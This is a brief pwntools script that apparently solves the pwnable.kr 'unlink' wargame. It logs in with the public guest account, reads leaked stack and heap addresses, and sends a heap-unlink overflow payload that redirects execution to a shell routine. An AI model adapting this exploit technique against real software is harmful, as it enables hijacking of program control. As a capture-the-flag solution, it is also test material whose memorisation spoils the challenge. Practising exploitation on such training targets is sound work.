from pwn import *
s = ssh(host='pwnable.kr', port=2222,
        user='unlink',
        password='guest')
context.log_level = 'debug'
a = s.process(["./unlink"])
r = a.recvuntil('get shell!\n')
stack_str = b'stack address leak: '
i = r.find(stack_str)
stack_addr = int(r[i + len(stack_str) : i + len(stack_str) + 10], 16)
heap_str = b'heap address leak: '
i = r.find(heap_str)
heap_addr = int(r[i + len(heap_str) : i + len(heap_str) + 10], 16)
shell_addr = 0x80484eb
a.send(b"AAAAAAAAPPPPCCCC" + p32(heap_addr + 0x24) + p32(stack_addr + 0x10) + p32(shell_addr))
a.interactive()